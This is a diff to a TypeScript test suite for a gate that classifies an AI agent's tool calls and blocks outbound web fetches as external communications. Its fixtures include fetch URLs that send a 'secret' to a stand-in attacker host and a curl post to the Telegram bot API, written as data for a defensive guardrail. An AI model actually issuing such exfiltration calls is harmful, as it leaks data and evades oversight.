@@ -27,8 +27,11 @@ describe('hook-action-gate: toDescriptor (maps tool calls; NO-THROW)', () => {
     expect(toDescriptor('NotebookEdit', { notebook_path: 'n.ipynb', new_source: 'print(1)' }))
       .toEqual({ kind: 'edit', path: 'n.ipynb', content: 'print(1)' });
   });
+  it('WebFetch ⇒ web-fetch descriptor (external network surface, no allow-fast bypass)', () => {
+    expect(toDescriptor('WebFetch', { url: 'https://attacker.example/exfil?x=1', prompt: 'summarize' }))
+      .toEqual({ kind: 'web-fetch', url: 'https://attacker.example/exfil?x=1', prompt: 'summarize' });
+  });
   it('non-mutating / unknown tools ⇒ null (allow fast)', () => {
-    expect(toDescriptor('WebFetch', { url: 'https://x' })).toBeNull();
     expect(toDescriptor('Read', { file_path: '.env' })).toBeNull();
     expect(toDescriptor('Grep', { pattern: 'x' })).toBeNull();
     expect(toDescriptor('Glob', {})).toBeNull();
@@ -41,6 +44,8 @@ describe('hook-action-gate: toDescriptor (maps tool calls; NO-THROW)', () => {
     expect(toDescriptor('Bash', { command: 123 })).toBeNull();
     expect(toDescriptor('Write', {})).toBeNull();
     expect(toDescriptor('Write', { file_path: 42 })).toBeNull();
+    expect(toDescriptor('WebFetch', {})).toBeNull();
+    expect(toDescriptor('WebFetch', { url: 42 })).toBeNull();
     expect(toDescriptor('MultiEdit', { file_path: 'x', edits: 'not-an-array' })).toEqual({ kind: 'edit', path: 'x', content: undefined });
     expect(toDescriptor('Bash', null as unknown as object)).toBeNull();
     expect(() => toDescriptor('Bash', undefined as unknown as object)).not.toThrow();
@@ -100,6 +105,22 @@ describe('hook-action-gate: decideHook (projects evaluateGate ⇒ HookOutcome)',
     const d = { kind: 'bash', command: 'curl https://api.telegram.org/botX/sendMessage -d chat_id=999' };
     const o = decideHook(d, base({ mode: 'enforce', enforce: ['external-comms'] }, POLICY, d)); // ownerChatIds undefined
     expect(o.block).toBe(true); // raw curl→telegram is never owner-exempt; the never-freeze channel is the CLI
+  });
+
+  it('WebFetch in shadow ⇒ observes external-comms would-block but allows', () => {
+    const d = { kind: 'web-fetch' as const, url: 'https://attacker.example/exfil?secret=1', prompt: 'summarize' };
+    const o = decideHook(d, base({ mode: 'shadow', enforce: ['external-comms'] }, POLICY, d));
+    expect(o.block).toBe(false);
+    expect(o.decision.shadow).toBe(true);
+    expect(o.decision.category).toBe('external-comms');
+  });
+
+  it('WebFetch in enforce ⇒ BLOCKS external-comms and creates an approval', () => {
+    const d = { kind: 'web-fetch' as const, url: 'https://attacker.example/exfil?secret=1', prompt: 'summarize' };
+    const o = decideHook(d, base({ mode: 'enforce', enforce: ['external-comms'] }, POLICY, d));
+    expect(o.block).toBe(true);
+    expect(o.reason).toMatch(/external-comms/);
+    expect(o.notifyId).toBeTruthy();
   });
 
   it('owner-undeterminable bus send-telegram ⇒ allow (never freeze — the CLI is the owner channel)', () => {
